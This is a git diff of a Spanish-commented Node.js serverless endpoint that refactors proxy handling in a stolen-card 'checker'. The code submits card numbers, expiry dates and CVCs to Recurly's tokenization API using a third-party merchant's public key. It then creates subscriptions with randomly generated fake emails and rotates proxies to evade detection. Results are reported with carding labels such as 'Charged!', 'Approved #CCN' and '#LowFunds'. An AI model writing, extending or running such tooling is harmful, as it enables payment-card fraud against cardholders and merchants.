@@ -3,338 +3,392 @@ const fs = require('fs');
 const path = require('path');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 
-// Función para cargar y rotar proxies
-let proxies = [];
-let currentProxyIndex = 0;
-
-function loadProxies() {
-  try {
-    const filePath = path.join(process.cwd(), 'api', 'proxies.txt');
-    const proxyData = fs.readFileSync(filePath, 'utf8');
-    proxies = proxyData.split('\n')
-      .map(line => line.trim())
-      .filter(line => line && !line.startsWith('#'));
-    
-    console.log(`Loaded ${proxies.length} proxies`);
-    return proxies.length > 0;
-  } catch (error) {
-    console.error('Error loading proxies:', error);
-    return false;
-  }
-}
-
-function getNextProxy() {
-  if (proxies.length === 0) {
-    if (!loadProxies() || proxies.length === 0) {
-      return null;
+// Clase ProxyManager
+class ProxyManager {
+    constructor() {
+        this.enabled = true; // Activado por defecto
+        this.proxiesPath = path.join(process.cwd(), 'api', 'proxies.txt'); // Ruta para Vercel
+        this.proxies = [];
+        this.loadProxies();
     }
-  }
-  
-  const proxy = proxies[currentProxyIndex];
-  currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
-  return proxy;
+
+    loadProxies() {
+        if (!this.enabled) {
+            console.log('Proxy system is disabled');
+            return;
+        }
+
+        try {
+            if (fs.existsSync(this.proxiesPath)) {
+                const content = fs.readFileSync(this.proxiesPath, 'utf8');
+                this.proxies = content
+                    .split('\n')
+                    .filter(line => line.trim())
+                    .map(line => {
+                        const [host, port, username, password] = line.trim().split(':');
+                        return { host, port, auth: { username, password } };
+                    });
+                console.log(`Loaded ${this.proxies.length} proxies`);
+            } else {
+                // Proxies hardcodeados para Vercel (reemplazar con tus propios proxies)
+                console.log(`Proxy file not found: ${this.proxiesPath}. Using hardcoded proxies.`);
+                this.proxies = [
+                    // Ejemplo (reemplazar con proxies reales):
+                    // { host: "p.webshare.io", port: "80", auth: { username: "user1", password: "pass1" } }
+                ];
+                
+                if (this.proxies.length === 0) {
+                    console.log('No hardcoded proxies available. Will run without proxies.');
+                }
+            }
+        } catch (error) {
+            console.error('Error loading proxies:', error);
+            this.proxies = [];
+        }
+    }
+
+    getRandomProxy() {
+        if (!this.enabled || !this.proxies.length) return null;
+        return this.proxies[Math.floor(Math.random() * this.proxies.length)];
+    }
+
+    createProxyAgent(proxy) {
+        if (!this.enabled || !proxy) return null;
+        try {
+            const proxyUrl = `http://${proxy.auth.username}:${proxy.auth.password}@${proxy.host}:${proxy.port}`;
+            return new HttpsProxyAgent(proxyUrl);
+        } catch (error) {
+            console.error('Error creating proxy agent:', error);
+            return null;
+        }
+    }
+
+    getAxiosProxyConfig(proxy) {
+        if (!this.enabled || !proxy) return {};
+        
+        return {
+            proxy: {
+                host: proxy.host,
+                port: parseInt(proxy.port),
+                auth: {
+                    username: proxy.auth.username,
+                    password: proxy.auth.password
+                },
+                protocol: 'http'
+            }
+        };
+    }
 }
 
-function createProxyAgent(proxyString) {
-  try {
-    const [ip, port, username, password] = proxyString.split(':');
-    const proxyOptions = {
-      host: ip,
-      port: port,
-      auth: `${username}:${password}`
-    };
-    return new HttpsProxyAgent(proxyOptions);
-  } catch (error) {
-    console.error('Error creating proxy agent:', error);
-    return null;
-  }
-}
-
-// Cargar proxies al iniciar
-loadProxies();
+// Instancia del ProxyManager
+const proxyManager = new ProxyManager();
 
 // Función para generar email aleatorio
 function generateRandomEmail() {
-  const names = ['john', 'jane', 'mike', 'sara', 'alex', 'emma', 'james', 'lisa'];
-  const domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
-  const name = names[Math.floor(Math.random() * names.length)];
-  const randomNum = Math.floor(Math.random() * 1000);
-  const domain = domains[Math.floor(Math.random() * domains.length)];
-  return `${name}${randomNum}@${domain}`;
+    const names = ['john', 'jane', 'mike', 'sara', 'alex', 'emma', 'james', 'lisa'];
+    const domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
+    const name = names[Math.floor(Math.random() * names.length)];
+    const randomNum = Math.floor(Math.random() * 1000);
+    const domain = domains[Math.floor(Math.random() * domains.length)];
+    return `${name}${randomNum}@${domain}`;
 }
 
 // Crear token con Recurly (usando proxy)
 async function createRecurlyToken(cardNumber, month, year, cvc) {
-  // Obtener proxy
-  const proxyString = getNextProxy();
-  const proxyAgent = proxyString ? createProxyAgent(proxyString) : null;
-  const proxyInfo = proxyString ? proxyString.split(':')[0] : 'Direct';
-  
-  console.log(`Using proxy: ${proxyInfo}`);
-  
-  try {
-    const axiosConfig = {
-      headers: {
-        'authority': 'api.recurly.com',
-        'accept': '*/*',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://api.recurly.com',
-        'referer': 'https://api.recurly.com/js/v1/field.html',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
-      }
+    // Obtener proxy
+    const proxy = proxyManager.getRandomProxy();
+    let proxyInfo = 'Direct';
+    let axiosConfig = {
+        headers: {
+            'authority': 'api.recurly.com',
+            'accept': '*/*',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://api.recurly.com',
+            'referer': 'https://api.recurly.com/js/v1/field.html',
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+        }
     };
     
-    // Añadir proxy si está disponible
-    if (proxyAgent) {
-      axiosConfig.httpsAgent = proxyAgent;
+    // Configurar proxy si está disponible
+    if (proxy) {
+        try {
+            // Intentar con HttpsProxyAgent primero
+            const proxyAgent = proxyManager.createProxyAgent(proxy);
+            if (proxyAgent) {
+                axiosConfig.httpsAgent = proxyAgent;
+                proxyInfo = `${proxy.host}`;
+            } else {
+                // Si falla, usar configuración directa
+                const proxyConfig = proxyManager.getAxiosProxyConfig(proxy);
+                axiosConfig = { ...axiosConfig, ...proxyConfig };
+                proxyInfo = `${proxy.host} (direct config)`;
+            }
+        } catch (error) {
+            console.error('Error setting up proxy:', error);
+        }
     }
     
-    const response = await axios.post(
-      'https://api.recurly.com/js/v1/token',
-      new URLSearchParams({
-        'first_name': 'Bruno',
-        'last_name': 'Alexis',
-        'number': cardNumber,
-        'browser[color_depth]': '24',
-        'browser[java_enabled]': 'false',
-        'browser[language]': 'es-US',
-        'browser[referrer_url]': 'https://mysticinsight.online/mi/subscription',
-        'browser[screen_height]': '1280',
-        'browser[screen_width]': '800',
-        'browser[time_zone_offset]': '420',
-        'browser[user_agent]': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-        'month': month,
-        'year': year,
-        'cvv': cvc,
-        'version': '4.33.1',
-        'key': 'ewr1-GHqWaQhLRDLkFqmH9MVxeE',
-        'deviceId': 'siaXX9TbekYH1S1C',
-        'sessionId': 'Z0VJJh0T0F7Zuwmq',
-        'instanceId': 'jGAuKKML687jvFC0'
-      }).toString(),
-      axiosConfig
-    );
+    console.log(`Using proxy for token: ${proxyInfo}`);
     
-    return { data: response.data, proxy: proxyInfo };
-  } catch (error) {
-    console.error('Error creating token:', error.response?.data || error.message);
-    throw error;
-  }
+    try {
+        const response = await axios.post(
+            'https://api.recurly.com/js/v1/token',
+            new URLSearchParams({
+                'first_name': 'Bruno',
+                'last_name': 'Alexis',
+                'number': cardNumber,
+                'browser[color_depth]': '24',
+                'browser[java_enabled]': 'false',
+                'browser[language]': 'es-US',
+                'browser[referrer_url]': 'https://mysticinsight.online/mi/subscription',
+                'browser[screen_height]': '1280',
+                'browser[screen_width]': '800',
+                'browser[time_zone_offset]': '420',
+                'browser[user_agent]': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+                'month': month,
+                'year': year,
+                'cvv': cvc,
+                'version': '4.33.1',
+                'key': 'ewr1-GHqWaQhLRDLkFqmH9MVxeE',
+                'deviceId': 'siaXX9TbekYH1S1C',
+                'sessionId': 'Z0VJJh0T0F7Zuwmq',
+                'instanceId': 'jGAuKKML687jvFC0'
+            }).toString(),
+            axiosConfig
+        );
+        
+        return { data: response.data, proxy: proxyInfo };
+    } catch (error) {
+        console.error('Error creating token:', error.message);
+        throw { error, proxy: proxyInfo };
+    }
 }
 
 // Crear suscripción con Recurly (usando proxy)
 async function createSubscription(tokenId) {
-  // Obtener proxy
-  const proxyString = getNextProxy();
-  const proxyAgent = proxyString ? createProxyAgent(proxyString) : null;
-  const proxyInfo = proxyString ? proxyString.split(':')[0] : 'Direct';
-  
-  console.log(`Using proxy: ${proxyInfo}`);
-  
-  try {
-    const axiosConfig = {
-      headers: {
-        'authority': 'subtrack.turbograms.com',
-        'content-type': 'text/plain',
-        'origin': 'https://mysticinsight.online',
-        'referer': 'https://mysticinsight.online/',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
-      }
+    // Obtener proxy
+    const proxy = proxyManager.getRandomProxy();
+    let proxyInfo = 'Direct';
+    let axiosConfig = {
+        headers: {
+            'authority': 'subtrack.turbograms.com',
+            'content-type': 'text/plain',
+            'origin': 'https://mysticinsight.online',
+            'referer': 'https://mysticinsight.online/',
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+        }
     };
     
-    // Añadir proxy si está disponible
-    if (proxyAgent) {
-      axiosConfig.httpsAgent = proxyAgent;
+    // Configurar proxy si está disponible
+    if (proxy) {
+        try {
+            // Intentar con HttpsProxyAgent primero
+            const proxyAgent = proxyManager.createProxyAgent(proxy);
+            if (proxyAgent) {
+                axiosConfig.httpsAgent = proxyAgent;
+                proxyInfo = `${proxy.host}`;
+            } else {
+                // Si falla, usar configuración directa
+                const proxyConfig = proxyManager.getAxiosProxyConfig(proxy);
+                axiosConfig = { ...axiosConfig, ...proxyConfig };
+                proxyInfo = `${proxy.host} (direct config)`;
+            }
+        } catch (error) {
+            console.error('Error setting up proxy:', error);
+        }
     }
     
-    const response = await axios.post(
-      'https://subtrack.turbograms.com/rec/create-subscription-no-user',
-      {
-        plan_id: 'msi_lpr_6month',
-        token_id: tokenId,
-        email: generateRandomEmail(),
-        attribution: {
-          event_source_url: 'https://mysticinsight.online/mi/subscription',
-          client_user_agent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
-        }
-      },
-      axiosConfig
-    );
+    console.log(`Using proxy for subscription: ${proxyInfo}`);
     
-    return { response, proxy: proxyInfo };
-  } catch (error) {
-    console.error('Error creating subscription:', error.response?.data || error.message);
-    throw { error, proxy: proxyInfo };
-  }
+    try {
+        const response = await axios.post(
+            'https://subtrack.turbograms.com/rec/create-subscription-no-user',
+            {
+                plan_id: 'msi_lpr_6month',
+                token_id: tokenId,
+                email: generateRandomEmail(),
+                attribution: {
+                    event_source_url: 'https://mysticinsight.online/mi/subscription',
+                    client_user_agent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+                }
+            },
+            axiosConfig
+        );
+        
+        return { response, proxy: proxyInfo };
+    } catch (error) {
+        console.error('Error creating subscription:', error.response?.data || error.message);
+        throw { error, proxy: proxyInfo };
+    }
 }
 
 // Funciones auxiliares
 function getBrandFromNumber(cardNumber) {
-  if (cardNumber.startsWith('4')) return 'VISA';
-  if (cardNumber.startsWith('5')) return 'MASTERCARD';
-  if (cardNumber.startsWith('3')) return 'AMEX';
-  if (cardNumber.startsWith('6')) return 'DISCOVER';
-  return 'UNKNOWN';
+    if (cardNumber.startsWith('4')) return 'VISA';
+    if (cardNumber.startsWith('5')) return 'MASTERCARD';
+    if (cardNumber.startsWith('3')) return 'AMEX';
+    if (cardNumber.startsWith('6')) return 'DISCOVER';
+    return 'UNKNOWN';
 }
 
 function getBankFromNumber(cardNumber) {
-  // Simulación simple de banco basada en BIN
-  const bin = cardNumber.substring(0, 6);
-  return `BANK (${bin})`;
+    // Simulación simple de banco basada en BIN
+    const bin = cardNumber.substring(0, 6);
+    return `BANK (${bin})`;
 }
 
 function getTypeFromNumber(cardNumber) {
-  // Simulación de tipo basada en último dígito
-  return parseInt(cardNumber.slice(-1)) % 2 === 0 ? 'CREDIT' : 'DEBIT';
+    // Simulación de tipo basada en último dígito
+    return parseInt(cardNumber.slice(-1)) % 2 === 0 ? 'CREDIT' : 'DEBIT';
 }
 
 // Función principal para verificar una tarjeta
 async function checkCard(cardNumber, month, year, cvc) {
-  try {
-    console.log('Starting card check process...');
-    
-    // Paso 1: Crear token
-    const tokenResult = await createRecurlyToken(cardNumber, month, year, cvc);
-    const tokenResponse = tokenResult.data;
-    const tokenProxy = tokenResult.proxy;
-    
-    console.log('Token created:', tokenResponse.id);
-    
-    if (!tokenResponse || !tokenResponse.id) {
-      return {
-        success: false,
-        message: 'Could not create token',
-        details: tokenResponse,
-        proxy: tokenProxy
-      };
+    try {
+        console.log('Starting card check process...');
+        
+        // Paso 1: Crear token
+        const tokenResult = await createRecurlyToken(cardNumber, month, year, cvc);
+        const tokenResponse = tokenResult.data;
+        const tokenProxy = tokenResult.proxy;
+        
+        console.log('Token created:', tokenResponse.id);
+        
+        if (!tokenResponse || !tokenResponse.id) {
+            return {
+                success: false,
+                message: 'Could not create token',
+                details: tokenResponse,
+                proxy: tokenProxy
+            };
+        }
+        
+        // Paso 2: Crear suscripción
+        const subscriptionResult = await createSubscription(tokenResponse.id);
+        const subscriptionResponse = subscriptionResult.response;
+        const subscriptionProxy = subscriptionResult.proxy;
+        
+        console.log('Subscription response received');
+
+        // Procesar respuesta
+        let status, message;
+        
+        if (subscriptionResponse.status === 302 || subscriptionResponse.headers?.location) {
+            status = "approved";
+            message = "Charged! 🟩 [ $1.00 ]";
+        } else if (subscriptionResponse.data?.error?.toLowerCase().includes('insufficient funds')) {
+            status = "approved";
+            message = "Approved! #LowFunds 🟩";
+        } else if (subscriptionResponse.data?.error?.toLowerCase().includes('cvv') || 
+                  subscriptionResponse.data?.error?.toLowerCase().includes('security code')) {
+            status = "approved";
+            message = "Approved #CCN! 🟩";
+        } else {
+            status = "declined";
+            message = "Your card was declined. 🔴";
+        }
+
+        // Retornar resultado
+        return {
+            success: true,
+            card: {
+                number: `${cardNumber.substring(0, 6)}xxxxxx${cardNumber.substring(cardNumber.length - 4)}`,
+                brand: getBrandFromNumber(cardNumber),
+                bank: getBankFromNumber(cardNumber),
+                type: getTypeFromNumber(cardNumber)
+            },
+            result: message,
+            status: status,
+            proxy: `${tokenProxy}/${subscriptionProxy}`
+        };
+
+    } catch (error) {
+        console.error('Error in card check process:', error);
+        
+        // Manejar errores específicos
+        if (error.error?.response?.data?.error?.toLowerCase().includes('cvv') || 
+            error.error?.response?.data?.error?.toLowerCase().includes('security code')) {
+            return {
+                success: true,
+                card: {
+                    number: `${cardNumber.substring(0, 6)}xxxxxx${cardNumber.substring(cardNumber.length - 4)}`,
+                    brand: getBrandFromNumber(cardNumber),
+                    bank: getBankFromNumber(cardNumber),
+                    type: getTypeFromNumber(cardNumber)
+                },
+                result: "Approved #CCN! 🟩",
+                status: "approved",
+                proxy: error.proxy || 'Unknown'
+            };
+        }
+
+        return {
+            success: false,
+            message: error.error?.message || error.message || 'Error checking card',
+            error: error.error?.toString() || error.toString(),
+            proxy: error.proxy || 'Unknown'
+        };
     }
-    
-    // Paso 2: Crear suscripción
-    const subscriptionResult = await createSubscription(tokenResponse.id);
-    const subscriptionResponse = subscriptionResult.response;
-    const subscriptionProxy = subscriptionResult.proxy;
-    
-    console.log('Subscription response received');
-
-    // Procesar respuesta
-    let status, message;
-    
-    if (subscriptionResponse.status === 302 || subscriptionResponse.headers?.location) {
-      status = "approved";
-      message = "Charged! 🟩 [ $1.00 ]";
-    } else if (subscriptionResponse.data?.error?.toLowerCase().includes('insufficient funds')) {
-      status = "approved";
-      message = "Approved! #LowFunds 🟩";
-    } else if (subscriptionResponse.data?.error?.toLowerCase().includes('cvv') || 
-               subscriptionResponse.data?.error?.toLowerCase().includes('security code')) {
-      status = "approved";
-      message = "Approved #CCN! 🟩";
-    } else {
-      status = "declined";
-      message = "Your card was declined. 🔴";
-    }
-
-    // Retornar resultado
-    return {
-      success: true,
-      card: {
-        number: `${cardNumber.substring(0, 6)}xxxxxx${cardNumber.substring(cardNumber.length - 4)}`,
-        brand: getBrandFromNumber(cardNumber),
-        bank: getBankFromNumber(cardNumber),
-        type: getTypeFromNumber(cardNumber)
-      },
-      result: message,
-      status: status,
-      proxy: `${tokenProxy}/${subscriptionProxy}`
-    };
-
-  } catch (error) {
-    console.error('Error in card check process:', error);
-    
-    // Manejar errores específicos
-    if (error.error?.response?.data?.error?.toLowerCase().includes('cvv') || 
-        error.error?.response?.data?.error?.toLowerCase().includes('security code')) {
-      return {
-        success: true,
-        card: {
-          number: `${cardNumber.substring(0, 6)}xxxxxx${cardNumber.substring(cardNumber.length - 4)}`,
-          brand: getBrandFromNumber(cardNumber),
-          bank: getBankFromNumber(cardNumber),
-          type: getTypeFromNumber(cardNumber)
-        },
-        result: "Approved #CCN! 🟩",
-        status: "approved",
-        proxy: error.proxy || 'Unknown'
-      };
-    }
-
-    return {
-      success: false,
-      message: error.error?.message || error.message || 'Error checking card',
-      error: error.error?.toString() || error.toString(),
-      proxy: error.proxy || 'Unknown'
-    };
-  }
 }
 
 // Generar un nuevo token
 function generateNewToken() {
-  return Math.random().toString(36).substring(2, 15) + 
-         Math.random().toString(36).substring(2, 15);
+    return Math.random().toString(36).substring(2, 15) + 
+           Math.random().toString(36).substring(2, 15);
 }
 
 // Manejador principal
 module.exports = async (req, res) => {
-  // Habilitar CORS
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Authorization, Content-Type');
-  
-  // Manejar OPTIONS para preflight
-  if (req.method === 'OPTIONS') {
-    return res.status(200).end();
-  }
-  
-  // Solo permitir POST
-  if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Method not allowed' });
-  }
-  
-  try {
-    // Verificar que hay un header de autorización (no validamos el token específico)
-    const authHeader = req.headers['authorization'];
+    // Habilitar CORS
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Authorization, Content-Type');
     
-    if (!authHeader || !authHeader.startsWith('Bearer ')) {
-      return res.status(401).json({
-        success: false,
-        message: 'Authentication required'
-      });
+    // Manejar OPTIONS para preflight
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end();
     }
     
-    // Verificar datos de la tarjeta
-    const { cardNumber, month, year, cvc } = req.body;
-    
-    if (!cardNumber || !month || !year || !cvc) {
-      return res.status(400).json({ 
-        success: false, 
-        message: 'Missing required card details' 
-      });
+    // Solo permitir POST
+    if (req.method !== 'POST') {
+        return res.status(405).json({ error: 'Method not allowed' });
     }
     
-    // Verificar tarjeta
-    const result = await checkCard(cardNumber, month, year, cvc);
-    
-    // Generar nuevo token para la siguiente solicitud
-    const newToken = generateNewToken();
-    result.token = newToken;
-    
-    return res.status(200).json(result);
-  } catch (error) {
-    console.error('Check error:', error);
-    return res.status(500).json({
-      success: false,
-      message: 'Server error during card check',
-      error: error.message || 'Unknown error'
-    });
-  }
+    try {
+        // Verificar que hay un header de autorización (no validamos el token específico)
+        const authHeader = req.headers['authorization'];
+        
+        if (!authHeader || !authHeader.startsWith('Bearer ')) {
+            return res.status(401).json({
+                success: false,
+                message: 'Authentication required'
+            });
+        }
+        
+        // Verificar datos de la tarjeta
+        const { cardNumber, month, year, cvc } = req.body;
+        
+        if (!cardNumber || !month || !year || !cvc) {
+            return res.status(400).json({ 
+                success: false, 
+                message: 'Missing required card details' 
+            });
+        }
+        
+        // Verificar tarjeta
+        const result = await checkCard(cardNumber, month, year, cvc);
+        
+        // Generar nuevo token para la siguiente solicitud
+        const newToken = generateNewToken();
+        result.token = newToken;
+        
+        return res.status(200).json(result);
+    } catch (error) {
+        console.error('Check error:', error);
+        return res.status(500).json({
+            success: false,
+            message: 'Server error during card check',
+            error: error.message || 'Unknown error'
+        });
+    }
 };
